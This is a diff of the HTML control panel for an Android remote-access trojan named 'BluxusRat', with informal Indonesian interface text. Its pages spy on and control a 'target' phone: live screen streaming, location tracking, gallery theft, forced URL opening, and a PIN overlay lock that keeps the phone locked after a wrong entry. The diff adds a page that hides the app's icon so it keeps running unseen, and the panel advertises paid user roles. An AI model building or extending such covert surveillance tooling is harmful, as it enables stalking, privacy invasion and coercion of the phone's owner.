@@ -218,12 +218,14 @@
       <div class="dash-body">
         <div class="feature-grid" id="feature-grid"></div>
 
+        <!-- INFO -->
         <div class="feature-page" id="fp-info">
           <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Info Device</div></div>
           <div class="fp-desc">Detail lengkap device target. Semua data terupdate otomatis saat target online.</div>
           <div class="section" id="info-content"></div>
         </div>
 
+        <!-- LIVE CAM -->
         <div class="feature-page" id="fp-live">
           <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Live Cam</div></div>
           <div class="fp-desc">Stream layar target secara real-time. Cuma work di Android 11+ (SDK 30+).</div>
@@ -243,6 +245,7 @@
           </div>
         </div>
 
+        <!-- LOCATE -->
         <div class="feature-page" id="fp-locate">
           <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Locate</div></div>
           <div class="fp-desc">Ambil lokasi target secara real-time.</div>
@@ -259,11 +262,12 @@
           <div class="loc-coords" id="loc-coords">—</div>
         </div>
 
+        <!-- SENTER & STROBO -->
         <div class="feature-page" id="fp-flash">
           <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Senter & Strobo</div></div>
           <div class="fp-desc">Kontrol senter (flashlight) target. Strobo bakal bikin senter kedip tiap 1 detik.</div>
           <div class="toggle-row">
-            <div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-flashlight"></i></div><div class="tr-info"><div class="n">Senter</div><div class="d">Flashlight target</div></div></div>
+            <div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-lightbulb"></i></div><div class="tr-info"><div class="n">Senter</div><div class="d">Flashlight target</div></div></div>
             <label class="switch"><input type="checkbox" id="sw-flash"><span class="slider"></span></label>
           </div>
           <div class="toggle-row">
@@ -272,9 +276,10 @@
           </div>
         </div>
 
+        <!-- KUNCI HP -->
         <div class="feature-page" id="fp-lock">
           <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Kunci HP</div></div>
-          <div class="fp-desc">Kunci HP target pake overlay. Target harus masukin PIN 4-digit yang lo set.</div>
+          <div class="fp-desc">Kunci HP target pake overlay. Target harus masukin PIN 4-digit yang lo set. Kalo salah, HP tetep ke-lock.</div>
           <div class="section">
             <div class="field">
               <label>PIN 4 Digit</label>
@@ -287,6 +292,7 @@
           </div>
         </div>
 
+        <!-- VOLUME -->
         <div class="feature-page" id="fp-volume">
           <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Set Volume</div></div>
           <div class="fp-desc">Atur volume HP target. Geser slider buat naikin/turunin volume.</div>
@@ -301,9 +307,10 @@
           </div>
         </div>
 
+        <!-- KECERAHAN -->
         <div class="feature-page" id="fp-brightness">
           <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Set Kecerahan</div></div>
-          <div class="fp-desc">Atur tingkat kecerahan layar HP target.</div>
+          <div class="fp-desc">Atur tingkat kecerahan layar HP target. Slider kiri = redup, kanan = terang.</div>
           <div class="section">
             <div class="slider-row">
               <div class="slider-icon"><i class="fa-solid fa-sun"></i></div>
@@ -315,6 +322,7 @@
           </div>
         </div>
 
+        <!-- URL DIRECT -->
         <div class="feature-page" id="fp-url">
           <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">URL Direct</div></div>
           <div class="fp-desc">Buka URL di browser HP target secara otomatis.</div>
@@ -327,9 +335,10 @@
           </div>
         </div>
 
+        <!-- GALLERY -->
         <div class="feature-page" id="fp-gallery">
           <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Get Gallery</div></div>
-          <div class="fp-desc">Ambil semua foto dari galeri HP target.</div>
+          <div class="fp-desc">Ambil semua foto dari galeri HP target. Foto bakal di-load ke sini. Butuh izin storage di HP target.</div>
           <div class="section">
             <button class="btn btn-primary" id="btn-get-gallery"><i class="fa-solid fa-images"></i> Ambil Galeri</button>
             <div class="gallery-grid" id="gallery-grid" style="margin-top:14px">
@@ -337,6 +346,33 @@
             </div>
           </div>
         </div>
+
+        <!-- TOAST -->
+        <div class="feature-page" id="fp-toast">
+          <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Kirim Toast</div></div>
+          <div class="fp-desc">Tampilkan pesan toast di HP target. Pesan bakal muncul sebentar di layar target.</div>
+          <div class="section">
+            <div class="field">
+              <label>Pesan Toast</label>
+              <div class="input-wrap">
+                <div class="ico-badge"><i class="fa-solid fa-comment-dots"></i></div>
+                <input type="text" id="toast-message" placeholder="Contoh: Halo dari admin">
+              </div>
+            </div>
+            <button class="btn btn-primary" id="btn-send-toast"><i class="fa-solid fa-paper-plane"></i> Kirim Toast ke Target</button>
+          </div>
+        </div>
+
+        <!-- HIDE APP -->
+        <div class="feature-page" id="fp-hideapp">
+          <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Hide App</div></div>
+          <div class="fp-desc">Sembunyikan icon APK di HP target. App tetap jalan di background, tapi icon hilang dari launcher.</div>
+          <div class="section">
+            <button class="btn btn-primary" id="btn-hide-app" style="margin-bottom:10px"><i class="fa-solid fa-eye-slash"></i> Sembunyikan Icon</button>
+            <button class="btn btn-ghost" id="btn-show-app"><i class="fa-solid fa-eye"></i> Tampilkan Icon</button>
+          </div>
+        </div>
+
       </div>
     </div>
 
@@ -387,7 +423,7 @@
       </div>
     </div>
 
-    <!-- BENEFIT -->
+    <!-- BENEFIT ROLE -->
     <div class="screen" id="screen-benefit">
       <div class="dash-header">
         <div class="hamburger" id="btn-hamburger-benefit"><i class="fa-solid fa-bars"></i></div>
@@ -398,7 +434,7 @@
         <div class="benefit-hero fade-in">
           <div class="bh-icon"><i class="fa-solid fa-medal"></i></div>
           <div class="bh-title">Benefit Role</div>
-          <div class="bh-desc">Kenali role di BluxusRat & benefitnya.</div>
+          <div class="bh-desc">Kenali role di BluxusRat & benefitnya. Pilih role yang sesuai kebutuhanmu.</div>
         </div>
         <div id="role-cards" class="fade-in-1"></div>
         <div class="section fade-in-2">
